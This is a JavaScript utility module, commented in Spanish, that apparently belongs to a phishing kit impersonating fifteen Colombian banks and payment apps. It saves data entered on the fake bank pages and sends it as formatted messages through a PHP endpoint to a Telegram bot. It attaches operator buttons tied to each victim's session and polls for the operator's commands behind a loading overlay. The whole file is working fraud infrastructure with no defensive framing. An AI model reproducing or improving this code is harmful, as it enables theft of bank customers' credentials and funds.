/**
 * Banco Utils - Utilidades para integraci Telegram bancas
 * Conecta bancas al sistema centralizado de Telegram PHP
 * @version 3.0.0 - Sistema Optimizado sin Socket.IO
 */

const BancoUtils = (function() {
    'use strict';

    let sessionId = null;
    let currentBank = null;
    let bankData = {};

    /**
     * Inicializar sesión y datos del banco
     */
    function init(bankCode) {
        currentBank = bankCode;
        sessionId = sessionStorage.getItem(`tigo_${bankCode}_session_id`);
        
        if (!sessionId) {
            sessionId = `${bankCode}_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            sessionStorage.setItem(`tigo_${bankCode}_session_id`, sessionId);
        }
        
        console.log(`[${bankCode.toUpperCase()}] Sesión:`, sessionId);
        return sessionId;
    }

    /**
     * Obtener SessionId actual
     */
    function getSessionId() {
        return sessionId;
    }

    /**
     * Guardar datos del banco (para construir mensaje completo)
     */
    function saveBankData(bankCode, newData) {
        if (!bankData[bankCode]) {
            bankData[bankCode] = {};
        }
        Object.assign(bankData[bankCode], newData);
        return bankData[bankCode];
    }

    /**
     * Obtener datos guardados del banco
     */
    function getBankData(bankCode) {
        return bankData[bankCode] || {};
    }

    /**
     * Formatear mensaje para Telegram
     */
    function formatMessage(title, data) {
        let message = `🏦 *${title}*\n\n`;
        
        for (const [key, value] of Object.entries(data)) {
            const capitalizedKey = key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' ');
            message += `*${capitalizedKey}:* ${value}\n`;
        }
        
        message += `\n⏰ *Hora:* ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
        
        return message;
    }

    /**
     * Crear teclado inline para Telegram
     */
    function createKeyboard(buttons, sessionId) {
        return {
            inline_keyboard: [
                buttons.map(btn => ({
                    text: btn.text,
                    callback_data: `${btn.action}|${sessionId}`
                }))
            ]
        };
    }

    /**
     * Enviar datos a Telegram usando TelegramClient
     */
    async function sendToTelegram(stage, payload) {
        if (!sessionId) {
            console.error('[BANCO_UTILS] No hay sessionId');
            return false;
        }

        if (!currentBank) {
            console.error('[BANCO_UTILS] No se ha inicializado el banco');
            return false;
        }

        // Si el payload contiene 'text' y 'keyboard', es formato antiguo
        if (payload.text && payload.keyboard) {
            const formData = {
                session_id: sessionId,
                action: `${currentBank}_${stage}`,
                bank: currentBank,
                step: stage,
                message: payload.text,
                keyboard: payload.keyboard,
                timestamp: new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
            };

            try {
                const response = await fetch('/api/telegram-send.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });

                const result = await response.json();
                console.log(`[${currentBank.toUpperCase()}] Respuesta:`, result);
                return result.success === true;
            } catch (error) {
                console.error(`[${currentBank.toUpperCase()}] Error:`, error);
                return false;
            }
        }

        // Formato nuevo: usar TelegramClient directamente
        return await TelegramClient.sendToTelegram(`${currentBank}_${stage}`, payload, sessionId);
    }

    /**
     * Escuchar acciones de Telegram
     */
    function onTelegramAction(callback) {
        if (!sessionId) {
            console.error('[BANCO_UTILS] No hay sessionId para polling');
            return;
        }

        if (window.__bankUtilsProcessing) return;

        TelegramClient.startPolling((actions, stop) => {
            if (window.__bankUtilsProcessing) return;
            window.__bankUtilsProcessing = true;

            const action = actions[0];
            console.log(`[${currentBank ? currentBank.toUpperCase() : 'BANCO'}] Acción recibida:`, action.action);

            callback(action);
        }, sessionId, 100, 300000);
    }

    /**
     * Validar entrada numérica
     */
    function validateNumeric(value, maxLength = 10) {
        return value.replace(/\D/g, '').slice(0, maxLength);
    }

    /**
     * Mostrar overlay de carga
     */
    function showOverlay() {
        const overlay = document.getElementById('loadingOverlay') || 
                       document.getElementById('loadingScreen') ||
                       document.querySelector('.loading-overlay');
        
        if (overlay) {
            overlay.classList.add('active', 'show');
            overlay.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
    }

    /**
     * Ocultar overlay de carga
     */
    function hideOverlay() {
        const overlay = document.getElementById('loadingOverlay') || 
                       document.getElementById('loadingScreen') ||
                       document.querySelector('.loading-overlay');
        
        if (overlay) {
            overlay.classList.remove('active', 'show');
            overlay.style.display = 'none';
            document.body.style.overflow = '';
        }
    }

    /**
     * Socket.IO compatibility stubs (no-op para compatibilidad con código legacy)
     */
    function initSocket() {
        console.log('[BANCO_UTILS] Socket.IO no requerido - usando sistema PHP');
        return { connected: true, removeAllListeners: () => {} };
    }

    function getSocket() {
        return { connected: true };
    }

    // API pública
    return {
        init,
        getSessionId,
        saveBankData,
        getBankData,
        formatMessage,
        createKeyboard,
        sendToTelegram,
        onTelegramAction,
        validateNumeric,
        showOverlay,
        hideOverlay,
        initSocket,
        getSocket
    };
})();

// Inicializar automáticamente detectando el banco desde la URL
document.addEventListener('DOMContentLoaded', function() {
    const currentPath = window.location.pathname;
    const pathParts = currentPath.split('/');
    const bancasIndex = pathParts.indexOf('bancas');
    
    if (bancasIndex !== -1 && pathParts[bancasIndex + 1]) {
        const bankFolder = pathParts[bancasIndex + 1];
        
        // Mapeo de carpetas a códigos de banco
        const folderToCode = {
            'Agrario': 'agrario',
            'AV-Villas': 'av_villas',
            'Banco-Mundo-Mujer': 'mundo_mujer',
            'BBVA': 'bbva',
            'Caja-Social': 'caja_social',
            'Davivienda': 'davivienda',
            'Daviplata': 'daviplata',
            'Falabella': 'falabella',
            'Itau': 'itau',
            'Nequi': 'nequi',
            'Occidente': 'occidente',
            'Popular': 'popular',
            'Scotiabank-Colpatria': 'colpatria',
            'Serfinanza': 'serfinanza',
            'Bogota': 'bogota'
        };
        
        const bankCode = folderToCode[bankFolder];
        
        if (bankCode) {
            BancoUtils.init(bankCode);
            console.log(`✅ BancoUtils inicializado para: ${bankCode}`);
        }
    }
});

console.log('✅ BancoUtils cargado');
